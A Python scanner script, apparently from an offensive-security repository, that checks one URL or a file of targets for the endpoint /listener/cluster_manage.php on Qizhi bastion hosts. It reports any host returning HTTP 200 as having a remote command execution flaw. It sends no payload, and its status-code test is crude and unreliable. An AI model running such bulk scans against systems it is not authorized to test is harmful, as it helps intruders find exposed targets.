import requests
import argparse
import urllib3
import sys
import json

urllib3.disable_warnings()


def title():
    print("""
                               齐治堡垒机前台远程命令执行漏洞
                      use: python3  齐治堡垒机前台远程命令执行漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        url = self.url + "/listener/cluster_manage.php"
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Connection': 'close'
        }
        try:
            requests.packages.urllib3.disable_warnings()
            web = requests.get(url,proxies=proxies, headers=headers,verify=False)
            # py = json(web)
            if web.status_code == 200:
                print(self.url + "存在齐治堡垒机前台远程命令执行漏洞！")
                with open("齐治堡垒机前台远程命令执行漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            if web.status_code == 404:
                print("页面404")
                pass
            if web.status_code == 302:
                print("页面跳转")
                pass
            if web.status_code == 403:
                print("waf拦截")
                pass
        except requests.exceptions.ConnectionError:
            print("链接错误")
            pass


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="齐治堡垒机前台远程命令执行漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 齐治堡垒机前台远程命令执行漏洞.py -u http://127.0.0.1\neg2:>>>python3 齐治堡垒机前台远程命令执行漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
